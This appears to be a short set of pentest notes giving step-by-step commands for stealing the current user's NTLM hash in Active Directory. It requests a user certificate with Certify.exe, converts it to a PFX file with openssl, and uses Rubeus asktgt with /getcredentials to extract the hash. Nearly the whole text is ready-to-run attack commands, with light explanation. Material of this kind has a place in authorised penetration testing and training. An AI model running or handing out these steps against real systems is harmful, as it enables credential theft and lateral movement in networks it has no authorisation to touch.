# This Attack Provide the NLTM hash of the Current User
We have to transfer the few exe and Grap the NTLM Hash.
# Step By Step 
```langauge
1. Transfer the certify.exe and Run it
2. Make a pem file and export to pfx, than transfer it
3. Transfer the pfx and Run the Rubeus.exe
```
# 1. Run the Certify.exe 
```language
#Grap the ca Name from the ouput 
.\Certify.exe find /enrollable
#Put the ca Name and Hostname of the Box 
.\Certify.exe request /ca:<hostname>\<ca_name> /template:User
```
# 2. Save the key and Certificate  with .pem file
```language
nano user_name.pem

openssl pkcs12 -in user_name.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
# 3. Transfer the cert.pfx and Rebeus in Box
# 4. Extract the NTLM hash
```language
.\rubeus.exe asktgt /user:<current_user_name> /certificate:cert.pfx /getcredentials /show /nowrap
```
